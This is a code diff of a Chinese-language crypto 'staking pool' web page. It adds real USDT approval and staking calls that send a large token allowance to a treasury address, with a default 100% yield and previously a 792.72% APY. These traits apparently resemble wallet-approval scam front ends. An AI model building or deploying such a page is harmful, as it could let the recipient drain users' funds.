@@ -10,18 +10,23 @@ import { ParticleBackground } from '@/components/ParticleBackground'
 import { EnhancedButton } from '@/components/EnhancedButton'
 import { WalletStatus } from '@/components/WalletConnector'
 import { PriceChart } from '@/components/charts/PriceChart'
+import PartnersSection from '@/components/PartnersSection'
 import { 
   usePriceData, 
   useStatistics, 
   useYunPoolConfig,
-  useUserProfile,
   useUserDashboard,
   useCryptoPrices,
   useEthereumPrice
 } from '@/hooks/useData'
 import { useWallet } from '@/contexts/WalletContext'
+import { useWeb3Staking } from '@/hooks/useWeb3Staking'
+import { CURRENT_NETWORK } from '@/lib/contracts'
 import { useState, useEffect } from 'react'
 import Link from 'next/link'
+import { StakingModal } from '@/components/StakingModal'
+import BottomNavigation, { BottomSpacer } from '@/components/BottomNavigation'
+
 
 export default function Home() {
   const [faqOpen, setFaqOpen] = useState(false)
@@ -31,13 +36,26 @@ export default function Home() {
   // 钱包相关
   const { account, isConnected, connect, disconnect } = useWallet()
   
+  // Web3质押钩子
+  const {
+    isLoading: web3Loading,
+    isAuthorized: web3Authorized,
+    usdtBalance,
+    allowance,
+    isInitialized: web3Initialized,
+    approveUSDT,
+    createStaking,
+    getUSDTBalance,
+    checkAllowance,
+    switchToBSC
+  } = useWeb3Staking()
+  
   // API数据获取
   const { data: priceData } = usePriceData()
   const { data: cryptoPrices, isLoading: pricesLoading } = useCryptoPrices()
   const { data: ethPrice, isLoading: ethLoading } = useEthereumPrice()
   const { data: statistics } = useStatistics()
   const { data: yunpool } = useYunPoolConfig()
-  const { data: userProfile } = useUserProfile(account)
   const { data: dashboardData } = useUserDashboard(account)
 
   const ethData = cryptoPrices?.find((coin: any) => coin.id === 'ethereum')
@@ -60,39 +78,38 @@ export default function Home() {
   }
 
   // 质押相关状态
-  const [isAuthorized, setIsAuthorized] = useState(false)
   const [stakingAmount, setStakingAmount] = useState('')
   const [showStakingModal, setShowStakingModal] = useState(false)
+  const [txHash, setTxHash] = useState('')
   const [stakingStep, setStakingStep] = useState<'authorize' | 'stake'>('authorize')
-
+  
   // 获取用户余额
   useEffect(() => {
     const fetchUserData = async () => {
-      if (account && isConnected) {
+      // 确保account是有效的钱包地址字符串
+      if (account && isConnected && typeof account === 'string' && account.startsWith('0x') && account.length === 42) {
         try {
-          const response = await fetch(`/api/user/info?address=${account}`)
+          console.log('🔍 开始获取用户数据，地址:', account)
+          const response = await fetch(`/api/user/info?address=${encodeURIComponent(account)}`)
           const result = await response.json()
           
           if (response.ok && result.success) {
             setBalance(result.data.balance)
-            setIsAuthorized(result.data.isAuthorized)
             console.log('✅ 用户数据加载成功:', result.data)
           } else {
             console.error('❌ 获取用户数据失败:', result.error)
             // 使用默认值
             setBalance(0)
-            setIsAuthorized(false)
           }
         } catch (error) {
           console.error('❌ 获取用户数据错误:', error)
           // 使用默认值
           setBalance(0)
-          setIsAuthorized(false)
         }
       } else {
-        // 未连接钱包时重置状态
+        // 未连接钱包或地址无效时重置状态
+        console.log('🔄 重置用户状态 - 钱包连接状态:', isConnected, '地址类型:', typeof account, '地址:', account)
         setBalance(0)
-        setIsAuthorized(false)
       }
     }
 
@@ -101,12 +118,26 @@ export default function Home() {
 
   // 参与质押功能 (替换原有的handleJoinMining)
   const handleParticipate = async () => {
+    console.log('🎯 参与质押按钮被点击！')
+    console.log('钱包连接状态:', isConnected)
+    console.log('钱包地址:', account)
+    console.log('Web3初始化状态:', web3Initialized)
+    
     if (!isConnected) {
+      console.log('钱包未连接，开始连接...')
       connect()
       return
     }
+
+    if (!web3Initialized) {
+      console.log('⚠️ Web3尚未初始化，请稍候...')
+      alert('正在初始化Web3，请稍候重试...')
+      return
+    }
     
+    console.log('设置显示质押模态框...')
     setShowStakingModal(true)
+    console.log('showStakingModal 设置为:', true)
   }
 
   // 授权USDT
@@ -115,11 +146,24 @@ export default function Home() {
       connect()
       return
     }
+
+    if (!web3Initialized) {
+      alert('⚠️ Web3尚未初始化，请稍候重试...')
+      return
+    }
     
-    setIsLoading(true)
+    // 检查账户地址是否存在
+    if (!account) {
+      alert('❌ 请先连接钱包')
+      return
+    }
+    
     try {
-      // 模拟授权过程 (这里可以集成真实的Web3授权)
-      await new Promise(resolve => setTimeout(resolve, 2000))
+      console.log('🔑 开始Web3授权过程，钱包地址:', account)
+      
+      // 使用Web3进行真实的USDT授权
+      const tx = await approveUSDT()
+      console.log('✅ USDT授权成功，交易哈希:', tx.transactionHash)
       
       // 更新数据库中的授权状态
       const response = await fetch('/api/user/authorize', {
@@ -129,24 +173,32 @@ export default function Home() {
         },
         body: JSON.stringify({
           address: account,
-          isAuthorized: true
+          isAuthorized: true,
+          txHash: tx.transactionHash,
+          amount: '1000000', // 授权的额度
+          network: CURRENT_NETWORK.CHAIN_ID
         }),
       })
 
-      if (response.ok) {
-        setIsAuthorized(true)
+      if (!response.ok) {
+        // 获取详细错误信息
+        const errorData = await response.json()
+        throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`)
+      }
+
+      const result = await response.json()
+      
+      if (result.success) {
         setStakingStep('stake')
-        console.log('✅ USDT授权成功')
-        alert('✅ USDT授权成功！')
+        console.log('✅ 授权状态更新成功')
+        alert('✅ USDT授权成功！可以开始质押了')
       } else {
-        throw new Error('更新授权状态失败')
+        throw new Error(result.error || result.message || '授权状态更新失败')
       }
       
     } catch (error: any) {
       console.error('❌ 授权失败:', error)
       alert('❌ 授权失败: ' + error.message)
-    } finally {
-      setIsLoading(false)
     }
   }
 
@@ -156,15 +208,42 @@ export default function Home() {
       connect()
       return
     }
+
+    if (!web3Initialized) {
+      alert('⚠️ Web3尚未初始化，请稍候重试...')
+      return
+    }
+    
+    // 检查账户地址是否存在
+    if (!account) {
+      alert('❌ 请先连接钱包')
+      return
+    }
     
     if (!stakingAmount || parseFloat(stakingAmount) <= 0) {
       alert('请输入有效的质押金额')
       return
     }
     
-    setIsLoading(true)
+    // 检查余额（安全解析）
+    const currentBalance = parseFloat(usdtBalance || '0')
+    const stakeAmount = parseFloat(stakingAmount)
+    
+    if (stakeAmount > currentBalance) {
+      alert('❌ 余额不足')
+      return
+    }
+    
     try {
-      // 调用质押API
+      console.log('🔄 开始Web3质押过程，钱包地址:', account, '金额:', stakingAmount)
+      
+      // 使用Web3创建质押
+      const tx = await createStaking(stakingAmount, 100) // 默认100%收益率
+      console.log('✅ 质押创建成功，交易哈希:', tx.transactionHash)
+      
+      setTxHash(tx.transactionHash)
+      
+      // 调用质押API记录到数据库
       const response = await fetch('/api/staking', {
         method: 'POST',
         headers: {
@@ -174,35 +253,49 @@ export default function Home() {
           action: 'stake',
           address: account,
           amount: stakingAmount,
-          txHash: `stake_${Date.now()}`
+          txHash: tx.transactionHash,
+          network: CURRENT_NETWORK.CHAIN_ID,
+          contractAddress: CURRENT_NETWORK.SUPPORT_CONTRACT
         }),
       })
 
-      const result = await response.json()
-
       if (!response.ok) {
-        throw new Error(result.error || '质押失败')
+        // 获取详细错误信息
+        const errorData = await response.json()
+        throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`)
       }
 
-      console.log('✅ 质押成功:', result)
-      alert('✅ 质押成功！')
-      setStakingAmount('')
-      setShowStakingModal(false)
-      
-      // 更新余额
-      setBalance(parseFloat(result.data.newBalance))
+      const result = await response.json()
+
+      if (result.success) {
+        console.log('✅ 质押成功:', result)
+        alert('✅ 质押成功！您的投资已记录到智能合约')
+        setStakingAmount('')
+        setShowStakingModal(false)
+        
+        // 更新余额
+        if (result.data && result.data.newBalance) {
+          setBalance(parseFloat(result.data.newBalance))
+        }
+        
+        // 刷新USDT余额
+        if (web3Initialized) {
+          await getUSDTBalance()
+        }
+      } else {
+        throw new Error(result.error || result.message || '质押失败')
+      }
       
     } catch (error: any) {
       console.error('❌ 质押失败:', error)
       alert('❌ 质押失败: ' + error.message)
-    } finally {
-      setIsLoading(false)
     }
   }
 
   return (
     <div className="min-h-screen bg-background relative">
       <ParticleBackground />
+      
       {/* Header */}
       <header className="flex items-center justify-between p-4 frosted-glass border-b border-border/20 text-[#000000] bg-[#f9f900] font-bold">
         <div className="flex items-center gap-2 slide-in-up">
@@ -211,8 +304,6 @@ export default function Home() {
         </div>
         <WalletStatus />
       </header>
-
-
 
       {/* Hero Section */}
       <section className="relative py-8 px-4 binance-gradient">
@@ -232,24 +323,34 @@ export default function Home() {
       {/* Main Stats Section */}
       <section className="py-8 px-4">
         <div className="max-w-4xl mx-auto">
-          {/* Single Unified Stats Card */}
-          <Card className="frosted-glass rounded-2xl shadow-2xl stats-card">
-            <CardContent className="p-6 rounded-[17px] bg-[#171717]">
-              {/* Top Row: ETH Display + Join Button */}
-              <div className="flex justify-between items-center mb-6">
-                <div className="slide-in-up">
-                  <div className="text-4xl font-bold text-white mb-1">
-                    <CounterAnimation end={balance} decimals={2} className="counter-text" />
+          <Card className="frosted-glass border-0 rounded-[30px] overflow-hidden">
+            <CardContent className="p-8">
+              {/* 钱包连接状态 */}
+              <div className="flex items-center justify-between mb-8">
+                <div className="flex items-center gap-3">
+                  <div className="w-12 h-12 rounded-full bg-[#eab308] flex items-center justify-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-black">
+                      <circle cx="12" cy="12" r="10"/>
+                      <path d="m16 12-4-4-4 4"/>
+                      <path d="m16 16-4-4-4 4"/>
+                    </svg>
                   </div>
-                  <div className="text-base text-muted-foreground">ETH</div>
+                  <div>
+                    <div className="text-sm text-muted-foreground">Connected Network</div>
+                    <div className="text-lg font-bold text-white">
+                      {CURRENT_NETWORK.CHAIN_ID === 56 ? 'BSC' : 'ETH'}
+                    </div>
+                  </div>
                 </div>
-                <EnhancedButton 
-                  onClick={handleParticipate}
-                  disabled={isLoading}
-                  className="text-black hover:bg-primary/90 font-bold bg-[#eab308] rounded-[24px] text-[19px] px-[30px] py-[25px]"
-                >
-                  {isLoading ? '处理中...' : '参与质押'}
-                </EnhancedButton>
+                <div className="flex flex-col gap-2">
+                  <EnhancedButton 
+                    onClick={handleParticipate}
+                    disabled={isLoading}
+                    className="text-black hover:bg-primary/90 font-bold bg-[#eab308] rounded-[24px] text-[19px] px-[30px] py-[25px]"
+                  >
+                    {isLoading ? '处理中...' : '参与质押'}
+                  </EnhancedButton>
+                </div>
               </div>
 
               {/* Middle Row: Three Stats with clear separation */}
@@ -279,7 +380,7 @@ export default function Home() {
                 <div className="border-r border-border/20 pr-4 slide-in-up" style={{ animationDelay: '0.6s' }}>
                   <div className="text-xs text-muted-foreground mb-1">钱包余额:</div>
                   <div className="flex items-center gap-2">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 32 32" className="inline slow-spin">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 32 32" className="inline">
                       <linearGradient id="wallet-grad1" x1="16" x2="16" y1="5.25" y2="27.432" gradientUnits="userSpaceOnUse">
                         <stop offset="0" stopColor="#66c4c4" />
                         <stop offset="1" stopColor="#009393" />
@@ -317,8 +418,6 @@ export default function Home() {
           </Card>
         </div>
       </section>
-
-      
 
       {/* Liquidity Mining Data */}
       <section className="py-8 px-4 frosted-glass-light rounded-[18px] mx-4">
@@ -490,73 +589,12 @@ export default function Home() {
       </section>
 
       {/* Cooperative Platform */}
-      <section className="py-8 px-4 frosted-glass-light mx-4 rounded-lg">
-        <div className="max-w-6xl mx-auto">
-          <h3 className="text-2xl font-bold text-center mb-8 gold-text slide-in-up">Cooperative Platform</h3>
-
-          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
-            {[
-              { src: "https://ext.same-assets.com/590002659/1926889768.png", alt: "Bitfinex", name: "Bitfinex" },
-              { src: "https://ext.same-assets.com/590002659/3816864077.png", alt: "Okex", name: "Okex" },
-              { src: "https://ext.same-assets.com/590002659/4103284146.png", alt: "Gate.io", name: "Gate.io" },
-              { src: "https://ext.same-assets.com/590002659/1884424797.png", alt: "Kraken", name: "Kraken" },
-              { src: "https://ext.same-assets.com/590002659/1671120861.png", alt: "LBank", name: "LBank" },
-              { src: "https://ext.same-assets.com/590002659/694738711.png", alt: "Binance", name: "Binance" },
-            ].map((platform, index) => (
-              <Card key={platform.name} className="frosted-glass p-4 hover:bg-muted/20 transition-all duration-300 floating" style={{ animationDelay: `${index * 0.5}s` }}>
-                <div className="flex flex-col items-center gap-2">
-                  <img
-                    src={platform.src}
-                    alt={platform.alt}
-                    className="w-8 h-8 transition-transform duration-300 hover:scale-125"
-                  />
-                  <span className="text-sm text-muted-foreground">{platform.name}</span>
-                </div>
-              </Card>
-            ))}
-          </div>
-        </div>
-      </section>
+      <PartnersSection />
 
       {/* Bottom Navigation */}
-      <nav className="fixed bottom-0 left-0 right-0 frosted-glass border-t border-border">
-        <div className="flex justify-around items-center py-2">
-          {[
-            { src: "https://ext.same-assets.com/590002659/2588141536.png", alt: "Home", label: "Home", active: true, href: "/" },
-            { src: "https://ext.same-assets.com/590002659/1667291039.png", alt: "Mining", label: "Mining", active: false, href: "/mining" },
-            { src: "https://ext.same-assets.com/590002659/3073358967.png", alt: "Service", label: "Service", active: false, href: "/service" },
-            { src: "https://ext.same-assets.com/590002659/855995434.png", alt: "Invite", label: "Invite", active: false, href: "/invite" },
-            { src: "https://ext.same-assets.com/590002659/2669583638.png", alt: "User", label: "User", active: false, href: "/user" },
-          ].map((item) => (
-            <Link
-              key={item.label}
-              href={item.href}
-              className={`flex flex-col items-center py-2 px-4 transition-all duration-300 transform hover:scale-105 active:scale-95 ${
-                item.active ? 'scale-110' : ''
-              }`}
-            >
-              <img
-                src={item.src}
-                alt={item.alt}
-                className={`w-6 h-6 mb-1 transition-all duration-300 ${
-                  item.active
-                    ? 'filter brightness-0 saturate-100 contrast-200 hue-rotate-45'
-                    : 'filter brightness-0 invert'
-                }`}
-              />
-              <span className={`text-xs transition-all duration-300 ${
-                item.active ? 'text-primary font-semibold' : 'text-white'
-              }`}>
-                {item.label}
-              </span>
-            </Link>
-          ))}
-        </div>
-      </nav>
-
-      {/* Add bottom padding to account for fixed navigation */}
-      <div className="h-20" />
-
+      <BottomNavigation />
+      <BottomSpacer />
+      
       {/* 质押模态框 */}
       {showStakingModal && (
         <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4">
@@ -565,25 +603,46 @@ export default function Home() {
               智能质押池
             </h3>
             
+            {/* Web3初始化状态 */}
+            {!web3Initialized && (
+              <div className="bg-orange-500/10 border border-orange-500/20 rounded-lg p-3 mb-6">
+                <div className="flex items-center gap-2">
+                  <div className="w-2 h-2 bg-orange-500 rounded-full animate-pulse"></div>
+                  <span className="text-sm text-orange-500">正在初始化Web3...</span>
+                </div>
+              </div>
+            )}
+            
             {/* 授权状态 */}
             <div className="flex items-center justify-center gap-2 p-3 rounded-lg bg-muted/10 mb-6">
-              {isAuthorized ? (
-                <>
-                  <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
-                    <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-                    </svg>
-                  </div>
-                  <span className="text-green-500 font-medium">已授权</span>
-                </>
+              {web3Initialized ? (
+                web3Authorized ? (
+                  <>
+                    <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
+                      <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                      </svg>
+                    </div>
+                    <span className="text-green-500 font-medium">已授权</span>
+                  </>
+                ) : (
+                  <>
+                    <div className="w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center">
+                      <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.954-.833-2.732 0L3.268 16.5c-.77.833.19 2.5 1.732 2.5z" />
+                      </svg>
+                    </div>
+                    <span className="text-yellow-500 font-medium">需要授权</span>
+                  </>
+                )
               ) : (
                 <>
-                  <div className="w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center">
-                    <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.954-.833-2.732 0L3.268 16.5c-.77.833.19 2.5 1.732 2.5z" />
+                  <div className="w-5 h-5 bg-gray-500 rounded-full flex items-center justify-center">
+                    <svg className="w-3 h-3 text-white animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                     </svg>
                   </div>
-                  <span className="text-yellow-500 font-medium">需要授权</span>
+                  <span className="text-gray-500 font-medium">检查中...</span>
                 </>
               )}
             </div>
@@ -591,67 +650,99 @@ export default function Home() {
             {/* 余额信息 */}
             <div className="grid grid-cols-2 gap-4 mb-6">
               <div className="bg-muted/10 p-4 rounded-lg">
-                <div className="text-sm text-muted-foreground">钱包余额</div>
+                <div className="text-sm text-muted-foreground">USDT余额</div>
                 <div className="text-lg font-bold text-yellow-500">
-                  {balance.toFixed(2)} USDT
+                  {web3Initialized ? `${parseFloat(usdtBalance || '0').toFixed(2)} USDT` : '加载中...'}
                 </div>
               </div>
               <div className="bg-muted/10 p-4 rounded-lg">
-                <div className="text-sm text-muted-foreground">质押APY</div>
+                <div className="text-sm text-muted-foreground">授权额度</div>
                 <div className="text-lg font-bold text-green-500">
-                  792.72%
+                  {web3Initialized ? `${parseFloat(allowance || '0').toFixed(2)} USDT` : '加载中...'}
                 </div>
               </div>
             </div>
 
-            {/* 授权步骤 */}
-            {!isAuthorized && (
+            {/* 网络状态 */}
+            <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 mb-6">
+              <div className="flex items-center gap-2">
+                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
+                <span className="text-sm text-blue-500">
+                  {CURRENT_NETWORK.CHAIN_ID === 56 ? 'BSC' : 'ETH'}
+                </span>
+              </div>
+            </div>
+
+            {/* 操作区域 */}
+            {web3Initialized ? (
+              <>
+                {/* 授权步骤 */}
+                {!web3Authorized && (
+                  <div className="space-y-4">
+                    <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
+                      <p className="text-sm text-yellow-500">
+                        💡 质押前需要先授权USDT代币转账权限给资金地址
+                      </p>
+                      <p className="text-xs text-muted-foreground mt-2">
+                        接收地址: {CURRENT_NETWORK.TREASURY_ADDRESS}
+                      </p>
+                    </div>
+                    <button
+                      onClick={handleAuthorize}
+                      disabled={web3Loading}
+                      className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
+                    >
+                      {web3Loading ? '授权中...' : '授权 USDT'}
+                    </button>
+                  </div>
+                )}
+
+                {/* 质押步骤 */}
+                {web3Authorized && (
+                  <div className="space-y-4">
+                    <div>
+                      <label className="text-sm font-medium text-white block mb-2">
+                        质押金额
+                      </label>
+                      <div className="relative">
+                        <input
+                          type="number"
+                          placeholder="输入质押金额"
+                          value={stakingAmount}
+                          onChange={(e) => setStakingAmount(e.target.value)}
+                          className="w-full bg-muted/10 border border-muted/20 rounded-lg px-4 py-3 text-white placeholder-muted-foreground focus:outline-none focus:ring-2 focus:ring-yellow-500"
+                        />
+                        <button
+                          type="button"
+                          onClick={() => setStakingAmount(usdtBalance || '0')}
+                          className="absolute right-2 top-1/2 -translate-y-1/2 text-xs bg-muted/20 hover:bg-muted/30 px-2 py-1 rounded"
+                        >
+                          最大
+                        </button>
+                      </div>
+                    </div>
+                    <button
+                      onClick={handleStake}
+                      disabled={web3Loading || !stakingAmount}
+                      className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
+                    >
+                      {web3Loading ? '质押中...' : '立即质押'}
+                    </button>
+                  </div>
+                )}
+              </>
+            ) : (
               <div className="space-y-4">
-                <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
-                  <p className="text-sm text-yellow-500">
-                    💡 质押前需要先授权USDT代币转账权限
+                <div className="bg-gray-500/10 border border-gray-500/20 rounded-lg p-3">
+                  <p className="text-sm text-gray-500 text-center">
+                    🔄 正在初始化Web3连接，请稍候...
                   </p>
                 </div>
                 <button
-                  onClick={handleAuthorize}
-                  disabled={isLoading}
-                  className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
+                  disabled
+                  className="w-full bg-gray-500/50 text-gray-400 font-bold py-3 px-4 rounded-lg cursor-not-allowed"
                 >
-                  {isLoading ? '授权中...' : '授权 USDT'}
-                </button>
-              </div>
-            )}
-
-            {/* 质押步骤 */}
-            {isAuthorized && (
-              <div className="space-y-4">
-                <div>
-                  <label className="text-sm font-medium text-white block mb-2">
-                    质押金额
-                  </label>
-                  <div className="relative">
-                    <input
-                      type="number"
-                      placeholder="输入质押金额"
-                      value={stakingAmount}
-                      onChange={(e) => setStakingAmount(e.target.value)}
-                      className="w-full bg-muted/10 border border-muted/20 rounded-lg px-4 py-3 text-white placeholder-muted-foreground focus:outline-none focus:ring-2 focus:ring-yellow-500"
-                    />
-                    <button
-                      type="button"
-                      onClick={() => setStakingAmount(balance.toString())}
-                      className="absolute right-2 top-1/2 -translate-y-1/2 text-xs bg-muted/20 hover:bg-muted/30 px-2 py-1 rounded"
-                    >
-                      最大
-                    </button>
-                  </div>
-                </div>
-                <button
-                  onClick={handleStake}
-                  disabled={isLoading || !stakingAmount}
-                  className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
-                >
-                  {isLoading ? '质押中...' : '立即质押'}
+                  初始化中...
                 </button>
               </div>
             )}
